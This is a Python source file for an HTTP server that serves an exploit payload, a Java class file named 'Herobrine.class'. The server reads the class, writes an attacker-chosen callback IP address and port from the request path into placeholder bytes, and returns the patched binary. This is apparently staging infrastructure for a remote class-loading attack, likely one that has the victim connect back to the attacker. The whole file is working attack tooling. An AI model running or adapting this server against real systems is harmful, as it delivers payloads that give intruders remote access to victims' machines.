""" http server hosting the Herobrine class payload """
from http.server import BaseHTTPRequestHandler, HTTPServer
import ipaddress

SRV_PORT = 8000
SRC_PORT = 1337

HEROBRINE_CLASS = "Herobrine.class"

IP_ADDR_STAMP = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
PORT_NO_STAMP = b"BBBBBBBB"


class HerobrineHandler(BaseHTTPRequestHandler):
    """basic HTTP request handler"""

    @staticmethod
    def _stamp_str_data(buf: bytes, pattern: bytes, str_data: str) -> bytes:
        encoded = str_data.encode("ascii")
        encoded += b"\0" * (len(pattern) - len(encoded))
        return buf.replace(pattern, encoded, 1)

    def do_GET(self):
        try:
            # expect, e.g., /172.16.123.123/4444/Herobrine.class
            remote_ip, remote_port, class_file = self.path.strip("/").split("/")
            print(f"{remote_ip}:{remote_port} - {class_file}")
            _ = ipaddress.ip_address(remote_ip)
            _ = int(remote_port)
            assert len(remote_ip) < len(IP_ADDR_STAMP)
            assert len(remote_port) < len(PORT_NO_STAMP)
            assert class_file == HEROBRINE_CLASS
        except:
            self.send_response(400)  # 400 Bad Request
            self.end_headers()
            return

        # open the class file and stamp the data
        try:
            with open(HEROBRINE_CLASS, "rb") as h:
                class_bytes = h.read()
            class_bytes = self._stamp_str_data(class_bytes, IP_ADDR_STAMP, remote_ip)
            class_bytes = self._stamp_str_data(class_bytes, PORT_NO_STAMP, remote_port)
        except Exception as exc:
            self.send_response(500)  # 500 Internal Server Error
            self.end_headers()
            return

        # send the stamped payload back
        self.send_response(200)  # 200 OK
        self.send_header("Content-Type", "application/octet-stream")
        self.end_headers()
        self.wfile.write(class_bytes)

if __name__ == "__main__":
    srv_addr = ("0.0.0.0", SRV_PORT)
    httpd = HTTPServer(srv_addr, HerobrineHandler)
    # httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile=SNARF_CERT, ssl_version=ssl.PROTOCOL_TLS)
    httpd.serve_forever()